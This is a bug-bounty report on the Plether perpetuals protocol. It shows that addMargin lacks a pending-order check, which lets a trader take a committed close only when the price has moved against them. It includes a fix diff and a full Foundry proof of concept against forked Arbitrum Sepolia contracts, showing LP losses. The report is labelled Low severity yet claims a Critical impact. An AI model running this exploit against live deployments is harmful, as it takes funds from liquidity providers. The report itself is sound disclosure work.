# \#98692 [SC-Low] `CfdEngine.addMargin()` has no pending-order check, so a trader decides after seeing the price whether its committed close fills

**Submitted on Nov 9th 2026 at 16:09:54 UTC by @EagleEye for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98692
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A trader commits a partial close with a `minPostPositionEquityAssets` bound that its position cannot meet. The close is priced at the first Pyth tick after the commit (P1). If the price then moves against the trader, the trader calls `addMargin`, the bound passes, and the close fills at the old price P1. If the price moves in the trader's favour, the trader does nothing, and the close fails at no cost. The HousePool LPs pay the price move every time the trader takes the fill. In the PoC, a 0.30% adverse move on a 250,000 USDG LONG gives the trader +645.62 USDG and costs the HousePool 652.52 USDG, net of all fees.

## Vulnerability Details

1. The fill price is the first Pyth tick after `commitTime` ([PletherOracle.sol#L610-L614](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L610-L614)). The order can be executed with that tick until its deadline, at most 60 s after the commit ([OrderExecutionOrchestrator.sol#L11](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderExecutionOrchestrator.sol#L11)).
2. The commit does not evaluate `minPostPositionEquityAssets`. It only requires `maxPostLeverageBps != 0` ([OrderLiquidationBatchLogic.sol#L298](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L298)).
3. At execution, the bound is checked against the live position margin ([CfdOrderPolicyEvaluatorBase.sol#L455-L470](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L455-L470), [#L532](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L532)). A failed bound ends the order terminally ([OrderRouterExecutionSidecar.sol#L880-L892](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L880-L892)). Close orders carry no bounty, so the failure costs the trader nothing (SECURITY.md:374).
4. `addMargin` checks only the caller, a nonzero amount and an open position ([CfdEngine.sol#L501-L528](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L501-L528)). It does not check `pendingOrderCounts`, so the trader can change that live margin after P1 is known.

SECURITY.md:658-659 states that "binding order semantics and the lack of a user cancellation path prevent traders from turning queued intents into free options". Points 1 to 4 give the trader exactly that option.

## Impact Details

Selected impact: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield (Critical).

The HousePool pays every trader's PnL from LP funds. When the price reaches P2, the trader's open loss already belongs to the LPs: "Marked LP equity includes only the portion of an unrealized trader loss collectible from that account's dedicated PnL pledge" (ACCOUNTING_SPEC.md:27), and the position's 12,500 USDG margin covers that loss in full. `addMargin` lets the trader close at P1 instead, so the part of the loss between P1 and P2 moves from LP equity to the trader. PoC results on the Arbitrum Sepolia v2.0.0 fork: the trader holds a 250,000 USDG LONG, commits a 90% close, and the basket rises 0.30% after P1. The trader ends flat in both rows.

| Same order, same prices | Trader (USDG) | HousePool (USDG) |
|---|---|---|
| With the bug: `addMargin`, close fills at P1 | 39,694.15 | 1,000,200.79 |
| No fill at P1, trader exits at P2 | 39,048.53 | 1,000,853.31 |
| Difference | +645.62 | −652.52 |

The loss equals the closed notional times the price move after P1. If the price moves the other way, the same order fails, and the trader's balance does not change.

## Recommendation

Reject `addMargin` while the account has pending orders:
```diff
diff --git a/packages/perps/src/CfdEngine.sol b/packages/perps/src/CfdEngine.sol
index 8e764882..b42326f7 100644
--- a/packages/perps/src/CfdEngine.sol
+++ b/packages/perps/src/CfdEngine.sol
@@ -16,6 +16,7 @@ import {ICfdEngineSettlementSidecar} from "@plether/perps/interfaces/ICfdEngineS
 import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
 import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
 import {IMarginClearinghouse} from "@plether/perps/interfaces/IMarginClearinghouse.sol";
+import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
 import {ITerminalNavBookV2} from "@plether/perps/interfaces/ITerminalNavBookV2.sol";
 import {IWithdrawGuard} from "@plether/perps/interfaces/IWithdrawGuard.sol";
 import {CfdEnginePlanLib} from "@plether/perps/libraries/CfdEnginePlanLib.sol";
@@ -513,6 +514,11 @@ contract CfdEngine is ICfdEngineTypes, IWithdrawGuard, ICfdEngineAdminHost, CfdT
         if (pos.lots == 0) {
             revert CfdEngine__NoOpenPosition();
         }
+        // Queued orders are evaluated against live margin at execution; a margin change after commit would let the
+        // trader decide after seeing the fill price whether a committed bound passes.
+        if (orderRouter != address(0) && IOrderRouterAccounting(orderRouter).pendingOrderCounts(account) != 0) {
+            revert CfdEngine__PendingOrders();
+        }
 
         bytes32 expectedOldHash = _beginTerminalCurveMutation(account);
         _realizeCarryFromSettlement(account, pos);
diff --git a/packages/perps/src/interfaces/ICfdEngineTypes.sol b/packages/perps/src/interfaces/ICfdEngineTypes.sol
index c5fcc2a0..cea02f62 100644
--- a/packages/perps/src/interfaces/ICfdEngineTypes.sol
+++ b/packages/perps/src/interfaces/ICfdEngineTypes.sol
@@ -55,6 +55,8 @@ interface ICfdEngineTypes {
     error CfdEngine__NotAccountOwner();
     /// @notice An operation requiring an existing position was requested for an account without one.
     error CfdEngine__NoOpenPosition();
+    /// @notice Position margin cannot change while the account has queued orders evaluated against it.
+    error CfdEngine__PendingOrders();
     /// @notice Risk, fee, spread, price-cap, or liquidation-bounty parameters violate engine bounds.
     error CfdEngine__InvalidRiskParams();
     /// @notice A risk-increasing or withdrawal action was attempted while degraded mode is latched.
```

## References

- SECURITY.md:658-659 (binding orders prevent free options), SECURITY.md:374 (zero close bounty)

## Proof of Concept

## Proof of Concept

### What the test does

1. The trader deposits its own USDG and opens a 250,000 USDG LONG.
2. The trader commits a 90% close with `minPostPositionEquityAssets = 2,000 USDG`. The remaining 10% keeps about 1,250 USDG of margin, so the bound fails as committed.
3. The fill tick P1 is published 1 s after the commit. At 5 s, the basket is at P2.
4. Branch A (P2 = +0.30%, against the LONG): the trader calls `addMargin(trader, 15,000 USDG)` and executes the order. It fills at P1. Branch B (P2 = −0.30%): the trader does nothing. A keeper executes the order, and it fails with `ConstraintViolation` at no cost to the trader.
5. Each branch is compared with an exit at P2 from the same state.

Pyth is out of scope. The test replaces it with the repository's own `MockPyth`, seeded with the real stored prices at the fork block. The ArbSys precompile (`0x64`) is mocked so that it follows `vm.roll`. No in-scope code is changed.

### How to run

1. Save the test below as `packages/perps/test/F034_MissingPendingOrderGuardIn.t.sol`.
2. In a first terminal, start a local Anvil fork of Arbitrum Sepolia. The RPC must be an archive node; the URL below is one:
   ```bash
   anvil --fork-url https://arbitrum-sepolia.gateway.tenderly.co --fork-block-number 323672710 --chain-id 421614 --port 8545
   ```
3. In a second terminal, run the test:
   ```bash
   cd packages/perps
   ARB_SEPOLIA_RPC_URL=http://127.0.0.1:8545 forge test --match-path test/F034_MissingPendingOrderGuardIn.t.sol -vv
   ```
4. Expected result: `[PASS] test_F034_poc()` and `[PASS] test_F034_control()`. The log shows `[A] trader gain vs exit at P2 (USDG 1e6) 645624289` and `[A] HousePool loss vs exit at P2 (USDG 1e6) 652521048`.

Tested with forge 1.8.7.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IMarginClearinghouse} from "@plether/perps/interfaces/IMarginClearinghouse.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IPerpsKeeper} from "@plether/perps/interfaces/IPerpsKeeper.sol";
import {IPerpsTraderActions} from "@plether/perps/interfaces/IPerpsTraderActions.sol";
import {IPyth, PythStructs} from "@plether/shared/interfaces/IPyth.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

interface IHousePoolF034 {
    function totalAssets() external view returns (uint256);
    function paused() external view returns (bool);
}

interface IEngineF034 {
    function degradedMode() external view returns (bool);
    function lastMarkPrice() external view returns (uint256);
    function CAP_PRICE() external view returns (uint256);
    function executionFeeBps() external view returns (uint256);
    function settlementBufferBps() external view returns (uint256);
    function frozenCloseSpreadBps() external view returns (uint256);
    function traderClaimBalanceAssets(address account) external view returns (uint256);
    function positions(address account)
        external
        view
        returns (
            uint256 size,
            uint256 margin,
            uint256 entryPrice,
            uint256 maxProfitAssets,
            CfdTypes.Side side,
            uint64 lastUpdateTime,
            int256 vpiAccrued
        );
    function riskParams()
        external
        view
        returns (
            uint256 vpiFactor,
            uint256 maxSkewRatio,
            uint256 maintMarginBps,
            uint256 initMarginBps,
            uint256 fadMarginBps,
            uint256 baseCarryBps,
            uint256 minBountyAssets,
            uint256 bountyBps,
            uint256 keeperShareBps,
            uint256 protocolShareBps
        );
    function addMargin(address account, uint256 amount) external;
}

interface IRouterF034 {
    function pletherOracle() external view returns (address);
    function maxExecutionWindowSeconds() external view returns (uint256);
    function updateMarkPrice(bytes[] calldata pythUpdateData) external payable;
    function pendingOrderCounts(address account) external view returns (uint256);
}

interface IOracleF034 {
    function pyth() external view returns (address);
    function isOracleFrozen() external view returns (bool);
    function pythFeedIds(uint256 index) external view returns (bytes32);
    function inversions(uint256 index) external view returns (bool);
    function housePool() external view returns (address);
    function orderSettlementWindow() external view returns (uint256);
}

interface IPythFeeF034 {
    function singleUpdateFeeInWei() external view returns (uint256);
}

interface IArbSysBlockF034 {
    function arbBlockNumber() external view returns (uint256);
}

contract F034_MissingPendingOrderGuardIn is Test {
    uint256 internal constant FORK_BLOCK = 323672710;

    address internal constant ROUTER = 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444;
    address internal constant ORACLE = 0x4f2c62A0E03657F52C633c19c11f88d8F0897Bb2;
    address internal constant ENGINE = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address internal constant CLEARINGHOUSE = 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A;
    address internal constant LIFECYCLE_BOOK = 0x327d5fd04e17D96DD5C4F845A0b4256A9e19645C;
    address internal constant POOL = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e;
    address internal constant USDG = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    address internal constant PYTH = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;

    uint256 internal constant BASE = 10_000;

    IHousePoolF034 internal pool = IHousePoolF034(POOL);
    IEngineF034 internal engine = IEngineF034(ENGINE);
    IRouterF034 internal routerViews = IRouterF034(ROUTER);
    IPerpsKeeper internal keeperRouter = IPerpsKeeper(ROUTER);
    IMarginClearinghouse internal clearinghouse = IMarginClearinghouse(CLEARINGHOUSE);
    IOrderLifecycleBook internal lifecycle = IOrderLifecycleBook(LIFECYCLE_BOOK);
    MockPyth internal pyth = MockPyth(PYTH);

    address internal trader = makeAddr("trader");
    address internal keeper = makeAddr("keeper");
    address internal refresher = makeAddr("refresher");

    bytes32[] internal feedIds;
    bool[] internal inverted;
    PythStructs.Price[] internal storedAtFork;
    uint256 internal pythFee;
    uint256 internal l2Height = FORK_BLOCK;
    uint64 internal cur;
    uint256 internal orderNonce;

    uint256 internal constant NOTIONAL = 250_000e6;
    uint256 internal constant MARGIN = 12_500e6;
    uint256 internal constant FUNDING = 40_000e6;
    uint256 internal constant EQUITY_BOUND = 2_000e6;
    uint256 internal constant TOGGLE = 15_000e6;
    uint256 internal constant MOVE_BPS = 30;
    uint64 internal constant DECISION_DELAY = 5;

    struct Outcome {
        uint256 traderValue;
        uint256 poolAssets;
        OrderV3Types.LifecycleStatus optionStatus;
    }

    function setUp() public virtual {
        vm.createSelectFork(vm.envString("ARB_SEPOLIA_RPC_URL"), FORK_BLOCK);
        assertEq(block.chainid, 421614, "not Arbitrum Sepolia");

        assertEq(routerViews.pletherOracle(), ORACLE, "router oracle drifted");
        assertEq(IOracleF034(ORACLE).housePool(), POOL, "oracle pool drifted");
        assertEq(IOracleF034(ORACLE).pyth(), PYTH, "oracle Pyth drifted");
        assertFalse(IOracleF034(ORACLE).isOracleFrozen(), "fork block must be a live (unfrozen) market");
        assertFalse(engine.degradedMode(), "engine not degraded at the fork");
        assertFalse(pool.paused(), "pool not paused at the fork");
        assertEq(pool.totalAssets(), 1_000_002e6, "pool = 1,000,002 USDG (Junior seed epoch settled)");
        assertEq(routerViews.maxExecutionWindowSeconds(), 60, "max execution window 60 s");
        assertEq(IOracleF034(ORACLE).orderSettlementWindow(), 15, "fill tick must lie in (commit, commit + 15 s]");
        for (uint256 i; i < 6; ++i) {
            feedIds.push(IOracleF034(ORACLE).pythFeedIds(i));
            inverted.push(IOracleF034(ORACLE).inversions(i));
        }
        _assertReleaseParameters();

        pythFee = IPythFeeF034(PYTH).singleUpdateFeeInWei();
        for (uint256 i; i < 6; ++i) {
            storedAtFork.push(IPyth(PYTH).getPriceUnsafe(feedIds[i]));
        }
        vm.etch(PYTH, type(MockPyth).runtimeCode);
        for (uint256 slot; slot < 12; ++slot) {
            vm.store(PYTH, bytes32(slot), bytes32(0));
        }
        pyth.setFee(pythFee);
        for (uint256 i; i < 6; ++i) {
            PythStructs.Price memory p = storedAtFork[i];
            pyth.setPrice(feedIds[i], p.price, p.conf, p.expo, p.publishTime);
            assertLe(p.publishTime, block.timestamp, "real stored Pyth time must not be in the future");
        }
        cur = uint64(block.timestamp);
        vm.deal(keeper, 1 ether);
        vm.deal(refresher, 1 ether);
        vm.deal(trader, 1 ether);
    }

    function _assertReleaseParameters() internal view {
        (,, uint256 maintMarginBps, uint256 initMarginBps, uint256 fadMarginBps,,,,,) = engine.riskParams();
        assertEq(engine.CAP_PRICE(), 2e8, "CAP_PRICE");
        assertEq(maintMarginBps, 10, "maintMarginBps");
        assertEq(initMarginBps, 20, "initMarginBps");
        assertEq(fadMarginBps, 300, "fadMarginBps");
        assertEq(engine.executionFeeBps(), 4, "executionFeeBps");
        assertEq(engine.settlementBufferBps(), 25, "settlementBufferBps");
        assertEq(engine.frozenCloseSpreadBps(), 50, "frozenCloseSpreadBps");
    }

    function test_F034_poc() public {
        uint256 down = BASE - MOVE_BPS;
        uint256 up = BASE + MOVE_BPS;

        uint256 closeSize = _openLong();
        uint256 pre = vm.snapshotState();

        Outcome memory attackA = _attack(closeSize, up, true);
        _rewind(pre);
        Outcome memory holdA = _exitOnly(up);
        _rewind(pre);
        Outcome memory bindA = _bindingClose(closeSize, up);
        _rewind(pre);

        Outcome memory attackB = _attack(closeSize, down, false);
        _rewind(pre);
        Outcome memory holdB = _exitOnly(down);
        _rewind(pre);
        Outcome memory bindB = _bindingClose(closeSize, down);
        _rewind(pre);

        uint256 lots = closeSize / 1e20;
        uint256 p1 = _p0();
        uint256 edge = lots * p1 * MOVE_BPS / BASE;
        console.log("LONG notional at P1 (USDG 1e6)", NOTIONAL);
        console.log("partial close notional at P1 (USDG 1e6)", lots * p1);
        console.log("price edge on the 90% leg, 0.30% (USDG 1e6)", edge);
        _logOutcome("[A adverse] attack", attackA);
        _logOutcome("[A adverse] hold, exit at P2", holdA);
        _logOutcome("[A adverse] binding close at P1", bindA);
        _logOutcome("[B favourable] attack", attackB);
        _logOutcome("[B favourable] hold, exit at P2", holdB);
        _logOutcome("[B favourable] binding close at P1", bindB);

        int256 gainA = int256(attackA.traderValue) - int256(holdA.traderValue);
        int256 lpLossA = int256(holdA.poolAssets) - int256(attackA.poolAssets);
        console.log("[A] trader gain vs exit at P2 (USDG 1e6)", gainA);
        console.log("[A] HousePool loss vs exit at P2 (USDG 1e6)", lpLossA);
        assertGt(gainA, int256(edge * 9 / 10), "A: trader avoided the adverse move after seeing it");
        assertGt(lpLossA, int256(edge * 9 / 10), "A: HousePool paid the avoided loss");
        assertEq(
            uint256(attackA.optionStatus), uint256(OrderV3Types.LifecycleStatus.Executed), "A: option order filled"
        );

        assertEq(uint256(attackB.optionStatus), uint256(OrderV3Types.LifecycleStatus.Failed), "B: option order failed");
        int256 gainB = int256(attackB.traderValue) - int256(bindB.traderValue);
        int256 lpLossB = int256(bindB.poolAssets) - int256(attackB.poolAssets);
        console.log("[B] trader gain vs binding close at P1 (USDG 1e6)", gainB);
        console.log("[B] HousePool loss vs binding close at P1 (USDG 1e6)", lpLossB);
        assertGt(gainB, int256(edge * 9 / 10), "B: trader escaped the binding fill after seeing the move");

        assertGe(int256(attackA.traderValue) + 1e6, int256(bindA.traderValue), "A: attack >= binding close (1 USDG)");
        assertGe(int256(attackB.traderValue) + 1e6, int256(holdB.traderValue), "B: attack >= exit at P2 (1 USDG)");
        int256 evAttack = (int256(attackA.traderValue) + int256(attackB.traderValue)) / 2;
        int256 evBind = (int256(bindA.traderValue) + int256(bindB.traderValue)) / 2;
        int256 evHold = (int256(holdA.traderValue) + int256(holdB.traderValue)) / 2;
        console.log("EV trader, attack (USDG 1e6)", evAttack);
        console.log("EV trader, honest binding close (USDG 1e6)", evBind);
        console.log("EV trader, honest hold (USDG 1e6)", evHold);
        int256 evLpLoss = (int256(bindA.poolAssets) + int256(bindB.poolAssets)) / 2
            - (int256(attackA.poolAssets) + int256(attackB.poolAssets)) / 2;
        console.log("EV HousePool loss per attempt vs binding close (USDG 1e6)", evLpLoss);
        assertGt(evAttack - evBind, int256(edge * 4 / 10), "EV: net profit over the binding close, fees included");
        assertGt(evAttack - evHold, int256(edge * 4 / 10), "EV: net profit over holding, fees included");
    }

    function test_F034_control() public {
        uint256 poolBefore = pool.totalAssets();
        uint256 closeSize = _openLong();
        Outcome memory o = _bindingClose(closeSize, BASE);
        assertEq(uint256(o.optionStatus), uint256(OrderV3Types.LifecycleStatus.Executed), "honest close executed");
        assertEq(_sizeOf(trader), 0, "trader flat");
        assertGe(pool.totalAssets() + 1e6, poolBefore, "pool did not lose on an honest flat round trip");
        _openLong();
        assertEq(routerViews.pendingOrderCounts(trader), 0, "no pending order");
        vm.prank(trader);
        engine.addMargin(trader, 1_000e6);
    }

    function _openLong() internal returns (uint256 closeSize) {
        _refreshMark(BASE);
        _fundTrader(trader, FUNDING);
        uint256 size = _quantize(NOTIONAL * 1e20 / _p0());
        OrderV3Types.ExecutionResult memory r = _trade(trader, CfdTypes.Side.LONG, size, MARGIN, false, BASE);
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Executed), "LONG opened");
        closeSize = _quantize(size * 9 / 10);
        _advance(cur + 30);
    }

    function _attack(uint256 closeSize, uint256 p2Bps, bool exercise) internal returns (Outcome memory o) {
        OrderV3Types.OrderRequest memory req = _request(CfdTypes.Side.LONG, closeSize, 0, true);
        req.bounds.minPostPositionEquityAssets = EQUITY_BOUND;
        vm.prank(trader);
        uint64 id = IPerpsTraderActions(ROUTER).commitOrder(req);
        uint64 t = cur;
        assertEq(routerViews.pendingOrderCounts(trader), 1, "close pending");

        _advance(t + DECISION_DELAY);
        bytes[] memory fillTick = _payload(BASE, t + 1, t);
        uint256 balBefore = _bal(trader);

        if (exercise) {
            vm.prank(trader);
            (bool ok,) = ENGINE.call(abi.encodeCall(IEngineF034.addMargin, (trader, TOGGLE)));
            console.log("addMargin while the close is pending succeeded (1 = yes)", ok ? 1 : 0);
            vm.prank(trader);
            OrderV3Types.ExecutionResult memory r = keeperRouter.executeOrder{value: 2 * pythFee}(id, fillTick);
            o.optionStatus = r.status;
            console.log("[A] option order terminal reason (1 = Executed, 8 = ConstraintViolation)", uint256(r.terminalReason));
        } else {
            vm.prank(keeper);
            OrderV3Types.ExecutionResult memory r = keeperRouter.executeOrder{value: 2 * pythFee}(id, fillTick);
            o.optionStatus = r.status;
            assertEq(
                uint256(r.terminalReason), uint256(OrderV3Types.TerminalReason.ConstraintViolation), "bound violated"
            );
            assertEq(_bal(trader), balBefore, "failed close cost the trader 0 USDG");
        }
        assertEq(routerViews.pendingOrderCounts(trader), 0, "option order terminal");

        _exitAll(p2Bps);
        o = _finish(o);
    }

    function _exitOnly(uint256 p2Bps) internal returns (Outcome memory o) {
        _advance(cur + DECISION_DELAY);
        _exitAll(p2Bps);
        o = _finish(o);
    }

    function _bindingClose(uint256 closeSize, uint256 p2Bps) internal returns (Outcome memory o) {
        OrderV3Types.OrderRequest memory req = _request(CfdTypes.Side.LONG, closeSize, 0, true);
        vm.prank(trader);
        uint64 id = IPerpsTraderActions(ROUTER).commitOrder(req);
        uint64 t = cur;
        _advance(t + DECISION_DELAY);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory r = keeperRouter.executeOrder{value: 2 * pythFee}(id, _payload(BASE, t + 1, t));
        o.optionStatus = r.status;
        _exitAll(p2Bps);
        o = _finish(o);
    }

    function _exitAll(uint256 bps) internal {
        uint256 size = _sizeOf(trader);
        if (size == 0) return;
        OrderV3Types.ExecutionResult memory r = _trade(trader, CfdTypes.Side.LONG, size, 0, true, bps);
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Executed), "exit executed");
    }

    function _finish(Outcome memory o) internal view returns (Outcome memory) {
        assertEq(_sizeOf(trader), 0, "trader flat at the end of the branch");
        o.traderValue = _bal(trader) + engine.traderClaimBalanceAssets(trader);
        o.poolAssets = pool.totalAssets();
        return o;
    }

    function _logOutcome(string memory label, Outcome memory o) internal pure {
        console.log(label);
        console.log("  trader value once flat (USDG 1e6)", o.traderValue);
        console.log("  HousePool totalAssets (USDG 1e6)", o.poolAssets);
    }

    function _p0() internal view returns (uint256) {
        return engine.lastMarkPrice();
    }

    function _refreshMark(uint256 basketBps) internal {
        _advance(cur + 2);
        vm.prank(refresher);
        routerViews.updateMarkPrice{value: pythFee}(_payload(basketBps, cur, cur - 1));
    }

    function _bal(address a) internal view returns (uint256) {
        return clearinghouse.balanceAssets(a);
    }

    function _sizeOf(address a) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(a);
    }

    function _fundTrader(address acct, uint256 amount) internal {
        deal(USDG, acct, amount);
        vm.startPrank(acct);
        IERC20(USDG).approve(CLEARINGHOUSE, amount);
        clearinghouse.depositFor(acct, amount);
        vm.stopPrank();
    }

    function _bounds() internal view returns (OrderV3Types.ExecutionBounds memory) {
        uint256 window = routerViews.maxExecutionWindowSeconds();
        return OrderV3Types.ExecutionBounds({
            submitBy: uint64(cur + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: lifecycle.currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _request(CfdTypes.Side side, uint256 size, uint256 margin, bool isClose)
        internal
        returns (OrderV3Types.OrderRequest memory)
    {
        bool longSide = side == CfdTypes.Side.LONG;
        uint256 target = isClose ? (longSide ? type(uint256).max : 1) : (longSide ? 1 : type(uint256).max);
        return OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("F034", ++orderNonce)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: target,
            isClose: isClose,
            bounds: _bounds()
        });
    }

    function _trade(address acct, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose, uint256 bps)
        internal
        returns (OrderV3Types.ExecutionResult memory r)
    {
        OrderV3Types.OrderRequest memory req = _request(side, size, margin, isClose);
        vm.prank(acct);
        uint64 id = IPerpsTraderActions(ROUTER).commitOrder(req);
        uint64 t = cur;
        _advance(t + 3);
        vm.prank(keeper);
        r = keeperRouter.executeOrder{value: 2 * pythFee}(id, _payload(bps, t + 1, t));
    }

    function _quantize(uint256 size) internal pure returns (uint256) {
        return size / 1e20 * 1e20;
    }

    function _advance(uint64 timestamp) internal {
        l2Height += 4 * (timestamp - cur) + 1;
        cur = timestamp;
        vm.warp(timestamp);
        vm.roll(l2Height);
        vm.mockCall(
            address(100), abi.encodeWithSelector(IArbSysBlockF034.arbBlockNumber.selector), abi.encode(l2Height)
        );
    }

    function _rewind(uint256 snap) internal {
        vm.revertToState(snap);
        vm.warp(cur);
        vm.roll(l2Height);
        vm.mockCall(
            address(100), abi.encodeWithSelector(IArbSysBlockF034.arbBlockNumber.selector), abi.encode(l2Height)
        );
    }

    function _payload(uint256 basketBps, uint64 tick, uint64 prevTick) internal view returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            PythStructs.Price memory p = storedAtFork[i];
            uint256 raw = uint256(uint64(p.price));
            uint256 conf = uint256(p.conf);
            if (inverted[i]) {
                raw = raw * BASE / basketBps;
                conf = conf * BASE / basketBps;
            } else {
                raw = raw * basketBps / BASE;
                conf = conf * basketBps / BASE;
            }
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: int64(uint64(raw)), conf: uint64(conf), expo: p.expo, publishTime: tick, prevPublishTime: prevTick
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }
}

```
